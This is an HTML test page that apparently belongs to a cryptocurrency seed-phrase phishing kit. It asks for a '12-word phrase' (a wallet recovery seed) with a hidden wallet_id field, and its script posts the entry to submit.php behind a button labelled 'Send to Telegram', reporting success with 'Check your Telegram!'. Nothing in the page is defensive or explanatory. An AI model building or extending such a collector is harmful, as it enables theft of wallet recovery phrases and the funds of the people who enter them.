<!DOCTYPE html>
<html>
<head>
    <title>Simple Test Form</title>
    <style>
        body { font-family: Arial; padding: 20px; max-width: 600px; margin: 0 auto; }
        input, textarea { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
        button { background: #007bff; color: white; padding: 12px 24px; border: none; cursor: pointer; }
        .result { margin-top: 20px; padding: 15px; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <h1>Simple Test Form</h1>
    <form id="testForm">
        <textarea name="phrase" placeholder="Enter 12-word phrase" rows="4" required>test word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12</textarea>
        <input type="hidden" name="wallet_id" value="Test">
        <button type="submit">Send to Telegram</button>
    </form>
    <div id="result" class="result" style="display:none;"></div>

    <script>
        document.getElementById('testForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.className = 'result';
            resultDiv.textContent = 'Sending...';

            fetch('submit.php', {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    resultDiv.className = 'result success';
                    resultDiv.textContent = '✅ SUCCESS! Check your Telegram!';
                } else {
                    resultDiv.className = 'result error';
                    resultDiv.textContent = '❌ ERROR: ' + (data.error || 'Unknown error');
                }
            })
            .catch(err => {
                resultDiv.className = 'result error';
                resultDiv.textContent = '❌ ERROR: ' + err.message;
            });
        });
    </script>
</body>
</html>
